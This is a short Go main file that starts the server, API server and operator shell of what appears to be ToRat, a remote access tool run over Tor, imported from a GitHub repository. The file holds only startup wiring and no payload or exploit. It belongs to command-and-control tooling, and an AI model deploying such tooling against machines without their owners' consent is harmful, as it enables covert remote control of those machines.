package main

import (
	"log"

	_ "github.com/dimiro1/banner/autoload"
	server "github.com/WildToastyMop/ToRat/torat_server"
)

func main() {
	go func() {
		if err := server.Start(); err != nil {
			log.Fatal("Error starting server:", err)
		}
	}()

	go server.APIServer()

	server.Shell()
}
